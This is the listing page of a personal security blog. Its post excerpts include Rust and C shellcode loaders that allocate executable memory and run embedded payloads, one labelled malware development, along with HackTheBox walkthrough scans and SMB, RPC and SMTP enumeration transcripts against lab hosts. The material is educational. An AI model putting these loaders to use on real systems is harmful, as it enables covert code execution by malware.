<!doctype html><html lang=en dir=auto><head><meta name=generator content="Hugo 0.135.0"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>x64.moe</title>
<meta name=keywords content="Blog,Portfolio"><meta name=description content="FAMASoon's blog"><meta name=author content="FAMASoon"><link rel=canonical href=https://famasoon.github.io/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://famasoon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://famasoon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://famasoon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://famasoon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://famasoon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://famasoon.github.io/index.xml><link rel=alternate hreflang=en href=https://famasoon.github.io/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-ZJPXHR8YPR"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-ZJPXHR8YPR")}</script><meta property="og:title" content="x64.moe"><meta property="og:description" content="FAMASoon's blog"><meta property="og:type" content="website"><meta property="og:url" content="https://famasoon.github.io/"><meta property="og:image" content="https://famasoon.github.io/static/famasoon.jpg"><meta property="og:site_name" content="x64.moe"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://famasoon.github.io/static/famasoon.jpg"><meta name=twitter:title content="x64.moe"><meta name=twitter:description content="FAMASoon's blog"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Organization","name":"x64.moe","url":"https://famasoon.github.io/","description":"FAMASoon's blog","thumbnailUrl":"https://famasoon.github.io/favicon.ico","sameAs":["https://twitter.com/FAMASoon","https://github.com/famasoon"]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://famasoon.github.io/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://famasoon.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://famasoon.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Executing functions in Rust with winapi</h2></header><div class=entry-content><p>Motivation I want to how to allocate memory on windows and execute code in buffers.
winapi winapi provides raw FFI bindings to all of Windows API. So, I will use this crate.
code When run command cargo run, popup calc.exe
use std::mem::transmute; use winapi::um::errhandlingapi::GetLastError; use winapi::um::memoryapi::VirtualAlloc; use winapi::um::processthreadsapi::CreateThread; use winapi::um::synchapi::WaitForSingleObject; fn main() { let buffer: [u8; 276] = [ 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00, ]; unsafe { let baseptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40); if GetLastError() != 0 { println!("virtual alloc failed: {}", GetLastError()); } let mut thread_id = 0; std::ptr::copy( buffer.as_ptr() as *const u8, baseptr as *mut u8, buffer.len(), ); let thread_handle = CreateThread( std::ptr::null_mut(), 0, Some(transmute(baseptr)), std::ptr::null_mut(), 0, &amp;mut thread_id, ); WaitForSingleObject(thread_handle, 0xFFFFFFFF); } }</p></div><footer class=entry-footer><span title='2023-06-04 00:00:00 +0000 UTC'>June 4, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;388 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to Executing functions in Rust with winapi" href=https://famasoon.github.io/posts/execfuncrustwithwinapi/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Connect to Ldap3 with Rust</h2></header><div class=entry-content><p>What is Ldap LDAP stands for Lightweight Directory Access Protocol. It is an open and platform-independent protocol used for accessing and maintaining directory services over a network. Directory services store and organize information, such as user names, passwords, email addresses, and other attributes, in a hierarchical structure.
LDAP is commonly used in client-server applications and network environments to facilitate centralized management of user authentication, authorization, and directory information. It allows clients to search, modify, and retrieve data from a directory server, which stores the directory information.
...</p></div><footer class=entry-footer><span title='2023-06-01 00:00:00 +0000 UTC'>June 1, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;310 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to Connect to Ldap3 with Rust" href=https://famasoon.github.io/posts/connectoldap3withrust/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Maldev - implant payload</h2></header><div class=entry-content><p>Shellcode One way for malware to embed code is to deploy shell code in memory. This time, we will check the method that works on Windows. Note that getchar() is used so that the debugger can attach to the process accordingly and check the memory.
.text payload is the shellcode. To embed arbitrary shell code in a .text section, do the following.
#include &lt;windows.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> int main(void) { void * exec_mem; BOOL rv; HANDLE th; DWORD oldprotect = 0; // Shellcode in text section unsigned char payload[] = { 0x90, // NOP 0x90, // NOP 0xcc, // INT3 0xc3 // RET }; unsigned int payload_len = 4; // Allocate a memory buffer for payload exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload); printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem); // Copy payload to new buffer RtlMoveMemory(exec_mem, payload, payload_len); // Make new buffer as executable rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &amp;oldprotect); printf("\nHit me!\n"); getchar(); // If all good, run the payload if ( rv != 0 ) { th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, -1); } return 0; } .data To embed it in a .data section, do the following
...</p></div><footer class=entry-footer><span title='2023-05-28 00:00:00 +0000 UTC'>May 28, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to Maldev - implant payload" href=https://famasoon.github.io/posts/implantpayload/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>HackTheBox Walkthrough - Brainf**k</h2></header><div class=entry-content><p>This post is writeup of the HackTheBox machine.
Brain**ck https://app.hackthebox.com/machines/Brainfuck
Nmap Nmap result
$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_http-title: Welcome to nginx! | tls-nextprotoneg: |_ http/1.1 | tls-alpn: |_ http/1.1 |_http-server-header: nginx/1.10.0 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.30 seconds Found some host name
...</p></div><footer class=entry-footer><span title='2023-05-10 00:00:00 +0000 UTC'>May 10, 2023</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2756 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to HackTheBox Walkthrough - Brainf**k" href=https://famasoon.github.io/posts/brainfuck/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>HackTheBox Nibbles Walkthrough</h2></header><div class=entry-content><p>Nibbles IP address : 10.10.10.75
Nmap result
$ nmap -sV -sT -sC 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-17 05:59 EST Nmap scan report for 10.10.10.75 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds Whatweb result
$ whatweb 10.10.10.75 http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75] Intersting /nibbleblog directory
In http://10.10.10.75/nibbleblog/
I see it was blog
$ whatweb http://10.10.10.75/nibbleblog/ http://10.10.10.75/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum] Searchsploit result
...</p></div><footer class=entry-footer><span title='2023-01-08 00:00:00 +0000 UTC'>January 8, 2023</span>&nbsp;·&nbsp;54 min&nbsp;·&nbsp;11329 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to HackTheBox Nibbles Walkthrough" href=https://famasoon.github.io/posts/nibbles/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>nmap cheat sheet</h2></header><div class=entry-content><p>Nmap cheat sheet $ nmap &lt;scan types> &lt;options> &lt;target> -snDisables port scanning.
-oA tnetStores the results in all formats starting with the name ’tnet'.
-iLPerforms defined scans against targets in provided ‘hosts.lst’ list.
-PE Performs the ping scan by using ‘ICMP Echo requests’ against the target. –packet-trace Shows all packets sent and received --reasonDisplays the reason for specific result. --top-ports=10Scans the specified top ports that have been defined as most frequent.
-p 21 Scans only the specified port. –packet-trace Shows all packets sent and received. -n Disables DNS resolution. –disable-arp-ping Disables ARP ping. -PnDisables ICMP Echo requests.
...</p></div><footer class=entry-footer><span title='2023-01-08 00:00:00 +0000 UTC'>January 8, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;240 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to nmap cheat sheet" href=https://famasoon.github.io/posts/nmapcheatsheet/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>rpc enumeration</h2></header><div class=entry-content><p>RPC Client RPC client
$ rpcclient -U "" 10.129.14.128Enter WORKGROUP\'s password: rpcclient$> rpcclient$> srvinfo DEVSMB Wk Sv PrQ Unx NT SNT DEVSM platform_id : 500 os version : 6.1 server type : 0x809a03 rpcclient$> enumdomainsname:[DEVSMB] idx:[0x0] name:[Builtin] idx:[0x1] rpcclient$> querydominfoDomain: DEVOPS Server: DEVSMB Comment: DEVSM Total Users: 2 Total Groups: 0 Total Aliases: 0 Sequence No: 1632361158 Force Logoff: -1 Domain Server State: 0x1 Server Role: ROLE_DOMAIN_PDC Unknown 3: 0x1 rpcclient$> netshareenumallnetname: print$ remark: Printer Drivers path: C:\var\lib\samba\printers password: netname: home remark: INFREIGHT Samba path: C:\home\ password: netname: dev remark: DEVenv path: C:\home\sambauser\dev\ password: netname: notes remark: CheckIT path: C:\mnt\notes\ password: netname: IPC$ remark: IPC Service (DEVSM) path: C:\tmp password: rpcclient$> netsharegetinfo notesnetname: notes remark: CheckIT path: C:\mnt\notes\ password: type: 0x0 perms: 0 max_uses: -1 num_uses: 1 revision: 1 type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE DACL ACL Num ACEs: 1 revision: 2 --- ACE type: ACCESS ALLOWED (0) flags: 0x00 Specific bits: 0x1ff Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS SID: S-1-1-0 rpcclient$> enumdomusersuser:[mrb3n] rid:[0x3e8] user:[cry0l1t3] rid:[0x3e9] rpcclient$> queryuser 0x3e9 User Name : cry0l1t3 Full Name : cry0l1t3 Home Drive : \\devsmb\cry0l1t3 Dir Drive : Profile Path: \\devsmb\cry0l1t3\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:50:56 CEST Password can change Time : Mi, 22 Sep 2021 17:50:56 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e9 group_rid: 0x201 acb_info : 0x00000014 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... rpcclient$> queryuser 0x3e8 User Name : mrb3n Full Name : Home Drive : \\devsmb\mrb3n Dir Drive : Profile Path: \\devsmb\mrb3n\profile Logon Script: Description : Workstations: Comment : Remote Dial : Logon Time : Do, 01 Jan 1970 01:00:00 CET Logoff Time : Mi, 06 Feb 2036 16:06:39 CET Kickoff Time : Mi, 06 Feb 2036 16:06:39 CET Password last set Time : Mi, 22 Sep 2021 17:47:59 CEST Password can change Time : Mi, 22 Sep 2021 17:47:59 CEST Password must change Time: Do, 14 Sep 30828 04:48:05 CEST unknown_2[0..31]... user_rid : 0x3e8 group_rid: 0x201 acb_info : 0x00000010 fields_present: 0x00ffffff logon_divs: 168 bad_password_count: 0x00000000 logon_count: 0x00000000 padding1[0..7]... logon_hrs[0..21]... rpcclient$> querygroup 0x201 Group Name: None Description: Ordinary Users Group Attribute:7 Num Members:2 brute force
...</p></div><footer class=entry-footer><span title='2023-01-08 00:00:00 +0000 UTC'>January 8, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;630 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to rpc enumeration" href=https://famasoon.github.io/posts/rpcenumeration/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Samba enumeration</h2></header><div class=entry-content><p>Samba samba
$ cat /etc/samba/smb.conf | grep -v "#\|\;"[global] workgroup = DEV.INFREIGHT.HTB server string = DEVSMB log file = /var/log/samba/log.%m max log size = 1000 logging = file panic action = /usr/share/samba/panic-action %d server role = standalone server obey pam restrictions = yes unix password sync = yes passwd program = /usr/bin/passwd %u passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* . pam password change = yes map to guest = bad user usershare allow guests = yes [printers] comment = All Printers browseable = no path = /var/spool/samba printable = yes guest ok = no read only = yes create mask = 0700 [print$] comment = Printer Drivers path = /var/lib/samba/printers browseable = yes read only = yes guest ok = no 設定 説明 [sharename] ネットワーク共有の名前。 workgroup = WORKGROUP/DOMAIN クライアントがクエリを実行したときに表示されるワークグループ。 path = /path/here/ ユーザーにアクセス権を付与するディレクトリ。 server string = STRING 接続が開始されたときに表示される文字列。 unix password sync = yes UNIX パスワードを SMB パスワードと同期しますか? usershare allow guests = yes 認証されていないユーザーが、定義された共有にアクセスすることを許可しますか? map to guest = bad user ユーザーのログイン要求が有効な UNIX ユーザーと一致しない場合はどうすればよいですか? browseable = yes この共有を利用可能な共有のリストに表示する必要がありますか? guest ok = yes パスワードを使用せずにサービスに接続できるようにしますか? read only = yes ユーザーにファイルの読み取りのみを許可しますか? create mask = 0700 新しく作成されたファイルにはどのような権限を設定する必要がありますか? browseable = yes 現在の共有で利用可能な共有をリストすることを許可しますか? read only = no ファイルの作成と変更を禁止しますか? writable = yes ユーザーにファイルの作成と変更を許可しますか? guest ok = yes パスワードを使用せずにサービスに接続できるようにしますか? enable privileges = yes 特定の SID に割り当てられた特権を尊重しますか? create mask = 0777 新しく作成されたファイルにはどのようなアクセス許可を割り当てる必要がありますか? directory mask = 0777 新しく作成されたディレクトリに割り当てる必要のあるアクセス許可は何ですか? logon script = script.sh ユーザーのログイン時にどのスクリプトを実行する必要がありますか? magic script = script.sh スクリプトが閉じられたときにどのスクリプトを実行する必要がありますか? magic output = script.out マジック スクリプトの出力をどこに保存する必要がありますか? Sambaに接続する
...</p></div><footer class=entry-footer><span title='2023-01-08 00:00:00 +0000 UTC'>January 8, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;448 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to Samba enumeration" href=https://famasoon.github.io/posts/sambaenum/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>SMTP enumeration</h2></header><div class=entry-content><p>SMTP SMTP
送信と通信は、SMTP サーバーにユーザーの要求を実行させる特別なコマンドによっても行われます。
指示 説明 AUTH PLAIN AUTH は、クライアントの認証に使用されるサービス拡張です。 HELO クライアントはそのコンピューター名でログインし、セッションを開始します。 MAIL FROM クライアントは電子メールの送信者に名前を付けます。 RCPT TO クライアントは、電子メールの受信者に名前を付けます。 DATA クライアントが電子メールの送信を開始します。 RSET クライアントは開始された送信を中止しますが、クライアントとサーバー間の接続は維持します。 VRFY クライアントは、メールボックスがメッセージ転送に使用できるかどうかを確認します。 EXPN クライアントは、このコマンドでメールボックスがメッセージングに使用できるかどうかも確認します。 NOOP クライアントは、タイムアウトによる切断を防ぐために、サーバーに応答を要求します。 QUIT クライアントはセッションを終了します。 $ telnet 10.129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server HELO mail1.inlanefreight.htb 250 mail1.inlanefreight.htb EHLO mail1 250-mail1.inlanefreight.htb 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250-DSN 250-SMTPUTF8 250 CHUNKING $ telnet 10.129.14.128 25 Trying 10.129.14.128... Connected to 10.129.14.128. Escape character is '^]'. 220 ESMTP Server EHLO inlanefreight.htb 250-mail1.inlanefreight.htb 250-PIPELINING 250-SIZE 10240000 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250-DSN 250-SMTPUTF8 250 CHUNKING MAIL FROM: &lt;cry0l1t3@inlanefreight.htb> 250 2.1.0 Ok RCPT TO: &lt;mrb3n@inlanefreight.htb> NOTIFY=success,failure 250 2.1.5 Ok DATA 354 End data with &lt;CR>&lt;LF>.&lt;CR>&lt;LF> From: &lt;cry0l1t3@inlanefreight.htb> To: &lt;mrb3n@inlanefreight.htb> Subject: DB Date: Tue, 28 Sept 2021 16:32:51 +0200 Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there? . 250 2.0.0 Ok: queued as 6E1CF1681AB QUIT 221 2.0.0 Bye Connection closed by foreign host. nmap
...</p></div><footer class=entry-footer><span title='2023-01-08 00:00:00 +0000 UTC'>January 8, 2023</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;433 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to SMTP enumeration" href=https://famasoon.github.io/posts/smtpenum/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>[Note] How to build v8 for AFL</h2></header><div class=entry-content><p>I built v8 to run fuzzing in AFL. First, install depot_tools using the link below. And then download the v8 source code.
https://v8.dev/docs/source-code
Next, create an afl directory in the v8/third_party directory and download the contents of the following link.
https://chromium.googlesource.com/chromium/src/+/refs/heads/master/third_party/afl/
Next, go to the v8 directory and execute the following command.
gn gen out/libfuzzer '--args=use_afl=true is_asan=true optimize_for_fuzzing = true ' --check ninja -C out/libfuzzer d8 afl-fuzz -D -i third_party/afl/src/testcases/others/js/ -o fuzzout -M fuzz1 ./out/libfuzzer/d8 This was a afl-g++ based fuzzing method. You can probably use clang for faster fuzzing. You can also use fuzzilli or Dharma for fuzzing.
...</p></div><footer class=entry-footer><span title='2022-08-23 00:00:00 +0000 UTC'>August 23, 2022</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;100 words&nbsp;·&nbsp;FAMASoon</footer><a class=entry-link aria-label="post link to [Note] How to build v8 for AFL" href=https://famasoon.github.io/posts/afl/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://famasoon.github.io/>«&nbsp;Prev&nbsp;
</a><a class=next href=https://famasoon.github.io/page/3/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://famasoon.github.io/>x64.moe</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>